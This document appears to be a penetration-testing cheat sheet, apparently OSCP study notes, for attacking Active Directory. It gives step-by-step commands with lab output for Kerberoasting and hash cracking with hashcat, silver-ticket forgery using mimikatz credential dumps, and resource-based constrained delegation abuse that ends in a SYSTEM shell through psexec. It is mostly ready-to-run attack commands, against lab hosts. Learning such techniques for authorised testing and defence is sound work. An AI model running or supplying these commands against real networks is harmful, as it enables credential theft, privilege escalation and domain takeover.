## Kerbroast

```bash

# Kerbroast with impacket-GetUserSPNs (Requires auth)
impacket-GetUserSPNs -dc-ip 10.10.x.x -request -outputfile crack/hashes.kerbroast oscp.exam/user
cat hashes.kerbroast

# Kerbroast with rubeus 
.\Rubeus.exe kerberoast /nowrap

# Adding /tgtdeleg forces the use of rc4 encryption (23)
.\Rubeus.exe kerberoast /tgtdeleg /nowrap

# Crack the password with hashcat
hashcat --help | grep -i "Kerberos"
	13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol

# Use hashcat to crack the password
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


```



## Silver ticket
- In general, we need to collect the following three pieces of information to create a silver ticket:
	- SPN password hash
	- Domain SID
	- Target SPN


```ps

# Lets first confirm we don't have access to the recourse HTTP SPN mapped to iis_service
iwr -UseDefaultCredentials http://web04

# Use mimikatz to retrieve the SPN password hash of the iis_service
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
	Username : iis_service
	NTLM : 4d28cf5252d39971419580a51484ca09

# Get the domain SID
# This can be done by retrieving the SID of the current user and remove the user part
S-1-5-21-1987370270-658905905-1781884369-1105
S-1-5-21-1987370270-658905905-1781884369

# Get the target SPN, the HTTP SPN resource on WEB04
Get-NetComputer web04 | select serviceprincipalname		(Does not show HTTP)
(HTTP/web04.corp.com:80)

# Now we have all info required to create a silver ticket with mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit

# Check cached tickets with klist
klist
	Cached Tickets: (1)
		Client: jeffadmin @ corp.com
		Server: http/web04.corp.com @ corp.com

# Try to acces the web page again
iwr -UseDefaultCredentials http://web04
(Invoke-WebRequest 'http://www.example.org/').Content

```


## Resource-Based Constrained Delegation (GenericAll)

```bash

# Start by looking at the user owned (l.livingstone)
# Mark as owned
# Go to node info and check outbound object control --> Transative Object Control
# Shows we have GeneriAll to ResourcedDC
# Means we can abuse "Resource-Based Constrained Delegation"

# Method 1: rbcd.py (https://github.com/tothi/rbcd-attack/blob/master/rbcd.py)
# Add a fake computer with impacket
impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.241.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'attack$' -computer-pass 'Attacker123!'

# Use rbcd.py to abuse msDS-AllowedToActOnBehalfOfOtherIdentity property of the target
python3 rbcd.py -dc-ip 192.168.241.175 -t RESOURCEDC -f 'attack' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

# Impersonate the administrator account with impacket
impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'Attacker123!' -impersonate Administrator -dc-ip 192.168.241.175

# Saves the ticket localy
ls
	Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
	
# Export the ticket
export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache

# Add the hostname to the host file
sudo nano /etc/hosts
192.168.241.175	resourcedc.resourced.local

# Connect using psexec
impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.241.175
whoami
	nt authority\system

```
